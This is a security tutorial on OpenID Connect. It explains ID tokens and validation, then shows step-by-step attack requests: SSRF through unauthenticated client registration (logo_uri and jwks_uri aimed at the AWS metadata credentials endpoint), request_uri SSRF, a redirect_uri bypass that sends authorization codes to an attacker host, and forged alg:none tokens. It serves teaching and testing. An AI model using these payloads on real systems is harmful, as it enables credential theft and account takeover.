# OpenID Connect

OpenID Connect (OIDC) is an identity layer that sits on top of OAuth 2.0, adding a standardised way for a client application to verify *who* the user is — not just what resources they are authorised to access. Pure OAuth was designed for authorisation delegation and has no native concept of user identity; websites that tried to use it for login had to invent their own non-standard workarounds, leading to fragmented, incompatible, and often insecure implementations. OIDC solves this by standardising the scopes, the user data format, and the cryptographically signed ID token that the client receives as proof of the user's authenticated identity. 

**Fundamental principle: OpenID Connect answers the question OAuth cannot — "Who is this user?" — by introducing the ID token: a signed JWT that carries identity claims directly from the identity provider to the client application, without the client needing a separate API call to `/userinfo` to figure out who just logged in. The security model rests entirely on the validity of that JWT signature and the correct validation of its claims.**

***

## OIDC vs. Plain OAuth: Roles and Terminology

```
Role mapping (OIDC term → OAuth equivalent):
─────────────────────────────────────────────────────────────────────────────
OpenID Provider (OP)    ← OAuth Authorization Server + Resource Server
Relying Party (RP)      ← OAuth Client Application
End User                ← OAuth Resource Owner

What OIDC adds on top of OAuth:
  ✓ Standardised scopes (openid, profile, email, address, phone)
    → Same names across ALL providers; no per-provider scope mapping needed
  ✓ ID token (signed JWT delivered alongside access token)
    → Cryptographic proof of user identity and authentication event
  ✓ /userinfo endpoint with standardised claim names
  ✓ /.well-known/openid-configuration discovery document
  ✓ Dynamic client registration endpoint (/openid/register)
  ✓ request_uri parameter for passing auth params by reference
  ✓ Nonce parameter (replay attack protection for ID tokens)

What OIDC does NOT change:
  → OAuth grant types (still authorization code / implicit / hybrid)
  → Token endpoint, authorization endpoint — OIDC just adds to them
  → access_token usage for API calls — unchanged
  → All OAuth vulnerabilities still apply (redirect_uri, CSRF, etc.)
```

***

## OIDC Scopes and Claims

```http
# Authorization request with OIDC scopes:
GET /authorization?client_id=12345
                  &redirect_uri=https://client-app.com/callback
                  &response_type=code
                  &scope=openid%20profile%20email%20phone
                  &state=ae13d489bd00e3c24
                  &nonce=n-0S6_WzA2Mj HTTP/1.1
Host: oauth-authorization-server.com

# scope=openid → MANDATORY for OIDC; tells provider to issue an ID token
# scope=profile → basic identity claims
# scope=email → email + email_verified claims
# scope=address → formatted_address, street_address, locality, etc.
# scope=phone → phone_number + phone_number_verified claims

# nonce: random value included in the request, embedded in the ID token
#   → Client checks: ID token's nonce == nonce it sent
#   → Prevents ID token replay attacks (attacker cannot reuse a captured ID token
#     for a different session because the nonce won't match) ✓
```

### Standard OIDC Claims by Scope

```
scope=openid (always included):
  sub           → Subject identifier: unique, stable user ID at this provider
                  (e.g., "sub": "248289761001")
                  → Use sub (not email) as the primary user identifier in your app
                  → email can change; sub is permanent

scope=profile:
  name          → "Carlos Montoya"
  given_name    → "Carlos"
  family_name   → "Montoya"
  middle_name   → "José"
  nickname      → "carlo"
  preferred_username → "c.montoya"
  profile       → URL of profile page
  picture       → URL of profile picture
  website       → "https://carlos.dev"
  gender        → "male"
  birthdate     → "1990-01-23"
  zoneinfo      → "Europe/London"
  locale        → "en-GB"
  updated_at    → 1311280970  (Unix timestamp)

scope=email:
  email           → "carlos@carlos-montoya.net"
  email_verified  → true   ← whether the provider verified the email address
                             ⚠ Do NOT rely on email alone for identity matching
                               if email_verified is false

scope=address:
  address.formatted          → full formatted address
  address.street_address     → "Somewhere Street 123"
  address.locality           → "London"
  address.postal_code        → "SW1A 1AA"
  address.country            → "GB"

scope=phone:
  phone_number          → "+44 7911 123456"
  phone_number_verified → true
```

***

## The ID Token (JWT)

```
ID Token structure (JWT = Header.Payload.Signature):
─────────────────────────────────────────────────────────────────────────────
Header (Base64URL decoded):
{
  "alg": "RS256",       ← signature algorithm (RS256, ES256 — asymmetric preferred)
  "kid": "abc123",      ← key ID: which key in /.well-known/jwks.json was used
  "typ": "JWT"
}

Payload (Base64URL decoded):
{
  "iss": "https://oauth-authorization-server.com",  ← MUST match expected issuer
  "sub": "248289761001",                            ← user's unique ID at this provider
  "aud": "client_id_12345",                         ← MUST match YOUR client_id
  "exp": 1716239022,                                ← expiry (Unix timestamp)
  "iat": 1716235422,                                ← issued-at time
  "auth_time": 1716235400,                          ← when user authenticated
  "nonce": "n-0S6_WzA2Mj",                         ← MUST match nonce you sent
  "amr": ["pwd", "mfa"],                            ← auth methods used
  "acr": "urn:mace:incommon:iap:silver",            ← assurance level
  "name": "Carlos Montoya",                         ← profile claims (if scope=profile)
  "email": "carlos@carlos-montoya.net",             ← email claim (if scope=email)
  "email_verified": true
}

Signature:
  RSA-SHA256(base64url(header) + "." + base64url(payload), PRIVATE_KEY)
  → Verified with PUBLIC KEY from /.well-known/jwks.json


ID Token validation checklist (Relying Party MUST perform ALL):
─────────────────────────────────────────────────────────────────────────────
  ① iss  → equals the expected provider issuer URL
  ② aud  → contains your client_id
  ③ exp  → has not expired (compare to current UTC time)
  ④ iat  → issued recently (check for unreasonably old tokens)
  ⑤ nonce → matches the nonce you sent in the auth request
  ⑥ alg  → is an expected algorithm (NEVER accept "none")
  ⑦ sig  → signature verified using provider's public key from /jwks.json

⚠ Common validation failures and their consequences:
  ✗ Skip ① (iss check): attacker registers on a DIFFERENT provider that
    issues valid JWTs, uses that ID token to log in at YOUR app
    → Account takeover via IdP mix-up attack ✓
  ✗ Skip ② (aud check): ID token issued to a DIFFERENT client app
    accepted by your app → token audience confusion
  ✗ Accept alg=none: attacker strips the signature, modifies the payload
    (changes sub to admin user ID), re-encodes without signing → auth bypass ✓
  ✗ Skip ⑤ (nonce check): captured ID token replayed for different session ✓
```

### Response Types: Hybrid Flow

```http
# ID token can be requested alone, or alongside code or access token:

response_type=id_token          → ID token only (no access token, no code)
response_type=id_token token    → ID token + access token (implicit-style, in fragment)
response_type=id_token code     → ID token + authorization code (hybrid flow)
response_type=code              → Standard OAuth code (OIDC adds id_token at token step)

# Hybrid flow example:
GET /authorization?...&response_type=id_token%20code HTTP/1.1
# Response (in fragment for implicit parts, query param for code):
HTTP/1.1 302 Found
Location: https://client-app.com/callback
          ?code=AUTHCODE
          &state=ae13d489bd00e3c24
          #id_token=eyJhbGc...          ← ID token in fragment
          &expires_in=3600

# Use case: client can verify user identity immediately from the ID token
#           (cryptographically signed, no API call needed) AND separately
#           exchange the code for an access token to call APIs later.
# Trade-off: access token still never touches the browser (code flow back-channel) ✓
#            but ID token IS in the fragment (same exposure as implicit for tokens) ⚠
```

***

## Discovery: Identifying OIDC in the Wild

```http
# ── Step 1: Look for openid scope in the authorization request ────────────────
# Intercept the login flow in Burp → check authorization request parameters.
# If scope=openid present → OIDC in use ✓

# ── Step 2: Probe /.well-known/openid-configuration ──────────────────────────
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-authorization-server.com

# Response (standardised discovery document):
{
  "issuer":                "https://oauth-authorization-server.com",
  "authorization_endpoint":"https://oauth-authorization-server.com/auth",
  "token_endpoint":        "https://oauth-authorization-server.com/token",
  "userinfo_endpoint":     "https://oauth-authorization-server.com/me",
  "registration_endpoint": "https://oauth-authorization-server.com/openid/register",
                           ↑ Dynamic client registration — potential SSRF vector ✓
  "jwks_uri":              "https://oauth-authorization-server.com/.well-known/jwks.json",
  "request_uri_parameter_supported": true,
                           ↑ request_uri SSRF — potential attack vector ✓
  "response_types_supported": ["code", "token", "id_token", "code token", "id_token token"],
  "scopes_supported":      ["openid", "profile", "email", "address", "phone"],
  "claims_supported":      ["sub", "iss", "name", "email", "picture", ...],
  "subject_types_supported": ["public", "pairwise"],
  "token_endpoint_auth_methods_supported": ["client_secret_basic", "private_key_jwt"]
}

# Key fields to note during reconnaissance:
# registration_endpoint → dynamic client registration available? → test for unauth access
# request_uri_parameter_supported: true → request_uri SSRF possible
# jwks_uri → key management endpoint → needed for ID token signature verification

# ── Step 3: Force OIDC even if client doesn't use it ─────────────────────────
# Try adding openid to an existing OAuth request:
GET /auth?...&scope=profile                 → might return 200 without OIDC
GET /auth?...&scope=openid%20profile        → if OIDC supported, returns id_token ✓

# Try changing response_type to id_token:
GET /auth?...&response_type=code            → standard OAuth
GET /auth?...&response_type=id_token        → if OIDC supported, returns id_token ✓
# If error: "unsupported_response_type" → OIDC not configured
# If success: OIDC available → proceed to test OIDC-specific vulnerabilities
```

***

## Vulnerability 1: SSRF via Unprotected Dynamic Client Registration

When the `/openid/register` endpoint does not require authentication, an attacker can register a malicious client application and inject attacker-controlled URIs into properties the OAuth server subsequently fetches. 

```http
# ── STEP 1: Discover the registration endpoint ────────────────────────────────
GET /.well-known/openid-configuration HTTP/1.1
Host: oauth-authorization-server.com

# Look for: "registration_endpoint": "https://oauth-authorization-server.com/openid/register"

# ── STEP 2: Test if registration requires authentication ──────────────────────
# Spec says: registration endpoint SHOULD require authentication (bearer token)
# Vulnerable providers: accept registration with NO Authorization header at all

POST /openid/register HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/json
# Note: NO Authorization header

{
    "application_type": "web",
    "redirect_uris": ["https://attacker-website.com/callback"],
    "client_name": "Test App"
}

# If response: 200/201 with client_id and client_secret → UNAUTHENTICATED REGISTRATION ✓
# If response: 401 Unauthorized → authentication required → try with a token if available

# ── STEP 3: Identify URI properties the server FETCHES ────────────────────────
# RFC 7591 / OIDC spec defines these properties as URLs the server may fetch:
#
#   logo_uri                  → server may fetch to display app logo to users
#   jwks_uri                  → server WILL fetch to get client's public keys
#                               (used for private_key_jwt auth method)
#   sector_identifier_uri     → server WILL fetch to validate redirect URIs
#   request_uris              → server WILL fetch during authorization requests
#   initiate_login_uri        → server may fetch for third-party login initiation
#   policy_uri / tos_uri      → server may fetch for display
#
# ⚠ logo_uri is commonly fetched at CLIENT REGISTRATION TIME (second-order SSRF)
# ⚠ jwks_uri is fetched at TOKEN EXCHANGE TIME (CVE-2026-1180 in Keycloak)
# ⚠ sector_identifier_uri fetched at registration validation time

# ── STEP 4: Register with SSRF payload in logo_uri ────────────────────────────
# Target: AWS cloud metadata (IMDS) endpoint accessible from OAuth server

POST /openid/register HTTP/1.1
Host: oauth-authorization-server.com
Content-Type: application/json

{
    "application_type": "web",
    "redirect_uris": ["https://attacker-website.com/callback"],
    "client_name": "Malicious App",
    "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"
}

# OAuth server processes registration:
# → Validates logo_uri (or renders it) → makes outbound HTTP GET to logo_uri
# → GET http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
# → AWS IMDS responds with JSON containing IAM credentials:
{
  "Code":            "Success",
  "Type":            "AWS-HMAC",
  "AccessKeyId":     "ASIAXXX",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
  "Token":           "AQoDYXdzEJr...",
  "Expiration":      "2026-02-19T11:30:00Z"
}

# ── WHERE THE RESPONSE APPEARS ────────────────────────────────────────────────
# Logo_uri response included in registration response:
#   Some providers: include fetched URL content in their own API response
#     → SSRF response directly visible in HTTP response ✓
#   Some providers: cache the logo → retrieve it via the "client" logo endpoint
#     GET /client/[client_id]/logo → returns the fetched content ✓
#   Some providers: trigger fetch during OAuth flow → inspect subsequent requests


# ── INTERNAL PORT SCANNING / SERVICE ENUMERATION VIA SSRF ────────────────────
# Use logo_uri to probe internal services:
"logo_uri": "http://169.254.169.254/"               → AWS IMDS metadata root
"logo_uri": "http://169.254.169.254/latest/meta-data/"   → metadata keys
"logo_uri": "http://192.168.1.1/"                   → internal network gateway
"logo_uri": "http://localhost:8080/admin"            → internal admin panel
"logo_uri": "http://internal-db:5432"                → PostgreSQL (TCP probe)

# Different responses for open vs. closed ports:
#   Open port: registration succeeds or returns port's banner
#   Closed port: registration fails with connection refused error
# → Use response time / error message to map internal network


# ── jwks_uri SSRF (fetched at TOKEN TIME, not registration) ───────────────────
# When token_endpoint_auth_method = "private_key_jwt":
# OAuth server fetches jwks_uri to get client's public key for JWT verification.
# Attacker registers with:
"jwks_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
"token_endpoint_auth_method": "private_key_jwt"
# Then initiates an OAuth flow → server fetches jwks_uri at token exchange
# → SSRF triggered on demand, even if logo_uri is not fetched ✓ (CVE-2026-1180) [web:203]
```

***

## Vulnerability 2: SSRF via `request_uri` Parameter

The `request_uri` parameter allows the OAuth authorization request parameters to be passed as a URL pointing to a JWT, rather than inline in the query string. The OAuth server *fetches* that URL server-side — making it an SSRF vector by design. 

```http
# ── WHAT request_uri DOES ─────────────────────────────────────────────────────
# Normal authorization request: parameters inline in URL
GET /auth?client_id=12345&redirect_uri=...&scope=openid&response_type=code

# With request_uri: parameters in an external JWT file
GET /auth?client_id=12345&request_uri=https://attacker-website.com/request.jwt HTTP/1.1
Host: oauth-authorization-server.com

# OAuth server: fetches https://attacker-website.com/request.jwt
# → Parses the JWT to get the authorization parameters
# → Proceeds with the OAuth flow using those parameters

# ── WHY THIS IS SSRF ─────────────────────────────────────────────────────────
# The server makes an outbound HTTP request to the URL in request_uri.
# If attacker can supply an arbitrary URL → SSRF ✓
# Note: request_uri IS DIFFERENT FROM redirect_uri
#   redirect_uri: WHERE THE BROWSER IS SENT after consent (client-side redirect)
#   request_uri:  WHERE THE SERVER FETCHES JWT params from (server-side fetch)

# ── STEP 1: CHECK IF request_uri IS SUPPORTED ─────────────────────────────────
# Method 1: discovery document
GET /.well-known/openid-configuration
# Look for: "request_uri_parameter_supported": true
#            "request_uris": [...]   ← whitelisted URIs

# Method 2: Just try it
GET /auth?client_id=12345&request_uri=https://attacker-website.com/test.jwt
# If server makes a GET request to your domain → supported ✓
# If error: "request_uri not supported" → unsupported
# Some servers support it even without advertising it

# ── STEP 2: BYPASS URI ALLOWLISTING VIA DYNAMIC REGISTRATION ──────────────────
# Many servers that support request_uri only allow pre-registered URIs.
# Check registration endpoint — if unprotected, register your SSRF URI:

POST /openid/register HTTP/1.1
Content-Type: application/json

{
    "redirect_uris": ["https://client-app.com/callback"],
    "request_uris": ["https://attacker-website.com/ssrf.jwt"]
    ← register attacker's URL as an allowed request_uri
}
# Response: {"client_id": "dynamic_client_99", ...} ✓

# ── STEP 3: TRIGGER SSRF VIA request_uri ──────────────────────────────────────
# Point request_uri at an internal resource:

GET /auth?client_id=dynamic_client_99
         &request_uri=http://169.254.169.254/latest/meta-data/iam/security-credentials/admin
         HTTP/1.1
Host: oauth-authorization-server.com

# OAuth server fetches: http://169.254.169.254/...
# Response from IMDS included in OAuth error (server tried to parse IMDS response as JWT)
# IMDS JSON response → JWT parsing error message may contain the raw IMDS response ✓

# ── READING THE SSRF RESPONSE ─────────────────────────────────────────────────
# The OAuth server error response may include:
HTTP/1.1 400 Bad Request
{
  "error": "invalid_request_object",
  "error_description": "Failed to parse JWT: {\"Code\":\"Success\",\"AccessKeyId\":\"ASIAXXX\",
                        \"SecretAccessKey\":\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\",...}"
}
# → IMDS credentials leaked in error message ✓

# ── redirect_uri BYPASS VIA request_uri ───────────────────────────────────────
# Some servers validate redirect_uri in the query string but not inside the JWT
# pointed to by request_uri.

# Attacker's request.jwt (hosted at attacker-website.com/request.jwt):
{
  "client_id": "12345",
  "redirect_uri": "https://attacker-website.com/evil-callback",  ← bypasses validation ✓
  "scope": "openid profile",
  "response_type": "code",
  "state": "abc123"
}

# Authorization request:
GET /auth?client_id=12345
         &request_uri=https://attacker-website.com/request.jwt
         HTTP/1.1

# Server validates redirect_uri at query-string level → no redirect_uri in query string → passes ✓
# Server parses JWT → uses redirect_uri from JWT (not validated separately) → attacker's domain ✓
# Authorization code sent to attacker-website.com/evil-callback ✓
# → Account takeover via code interception ✓
```

***

## ID Token Validation Vulnerabilities

```http
# ── alg:none attack ───────────────────────────────────────────────────────────
# If the relying party accepts ID tokens with "alg": "none":
# Attacker crafts a valid-looking ID token with forged claims:

# Original header: {"alg":"RS256","kid":"abc123"}
# Attacker's header: {"alg":"none"}            ← no signature required
# Attacker's payload: {"sub":"admin-user-id","iss":"https://oauth-authorization-server.com",...}
# No signature (empty string after second ".")

# Forged ID token:
eyJhbGciOiJub25lIn0   ← {"alg":"none"}
.eyJzdWIiOiJhZG1pbi11c2VyLWlkIiwi...}   ← forged payload
.   ← empty signature

# If relying party doesn't check alg → accepts this token → attacker logged in as admin ✓

# ── iss (issuer) confusion ────────────────────────────────────────────────────
# Attacker creates their own OIDC provider (e.g., attacker-provider.com)
# Issues a valid ID token for their own provider with:
{
  "iss": "https://attacker-provider.com",   ← attacker's provider
  "sub": "victim@victim.com",               ← victim's email/ID
  "aud": "client_id_12345",                 ← legitimate client_id
  "exp": [future timestamp],
  "email": "victim@victim.com"
}
# If relying party checks signature but NOT issuer → accepts the token → IdP mix-up ✓

# ── aud (audience) confusion ──────────────────────────────────────────────────
# Attacker obtains an ID token from the same provider but for a DIFFERENT app:
{
  "iss": "https://oauth-authorization-server.com",
  "sub": "attacker-user-id",
  "aud": "different_client_12345",   ← issued to a DIFFERENT client app
  ...
}
# If your relying party doesn't validate aud matches YOUR client_id:
# → Accepts tokens issued to other apps → token audience confusion ✓

# ── Correct validation (must perform ALL checks) ──────────────────────────────
# Python example (using python-jose):
from jose import jwt
from jose.exceptions import JWTError
import requests

# Fetch public keys from OIDC provider
jwks = requests.get('https://oauth-authorization-server.com/.well-known/jwks.json').json()

try:
    claims = jwt.decode(
        id_token,
        jwks,
        algorithms=["RS256"],           # ① NEVER include "none"
        audience="client_id_12345",     # ② validate aud = your client_id
        issuer="https://oauth-authorization-server.com"  # ③ validate iss
    )
    # ④ verify exp: handled by jwt.decode() ✓
    # ⑤ verify nonce manually:
    assert claims["nonce"] == session["nonce"], "Nonce mismatch → replay attack"
    # ⑥ use claims["sub"] as stable user identifier (NOT email)
    user_id = claims["sub"]
except JWTError as e:
    abort(401, f"Invalid ID token: {e}")
```
